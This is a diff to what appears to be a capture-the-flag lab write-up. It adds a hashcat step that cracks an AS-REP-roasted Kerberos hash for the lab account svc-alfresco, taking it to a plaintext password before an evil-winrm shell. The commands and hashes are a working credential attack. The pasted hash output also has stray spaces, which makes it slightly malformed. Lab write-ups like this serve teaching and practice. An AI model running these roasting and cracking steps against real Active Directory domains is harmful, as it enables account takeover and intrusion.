@@ -68,7 +68,14 @@ root@kali# for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.1
 $krb5asrep$23$svc-alfresco@HTB:c213afe360b7bcbf08a522dcb423566c$d849f59924ba2b5402b66ee1ef332c2c827c6a5f972c21ff329d7c3f084c8bc30b3f9a72ec9db43cba7fc47acf0b8e14c173b9ce692784b47ae494a4174851ae3fcbff6f839c833d3740b0e349f586cdb2a3273226d183f2d8c5586c25ad350617213ed0a61df199b0d84256f953f5cfff19874beb2cd0b3acfa837b1f33d0a1fc162969ba335d1870b33eea88b510bbab97ab3fec9013e33e4b13ed5c7f743e8e74eb3159a6c4cd967f2f5c6dd30ec590f63d9cc354598ec082c02fd0531fafcaaa5226cbf57bfe70d744fb543486ac2d60b05b7db29f482355a98aa65dff2f
 ```
 
-I get the hash above for the user `svc-alfresco` and I get the password `s3rvice`.
+I get the hash above for the user `svc-alfresco`.
+
+I use hashcat to break the hash.
+
+```
+root@kali# hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force ...[snip]... $krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$ 5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004 d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:s3rvice ...[snip]...
+```
+
 
 I use evil-winrm to connect and shell access to the attacking ip. 
 
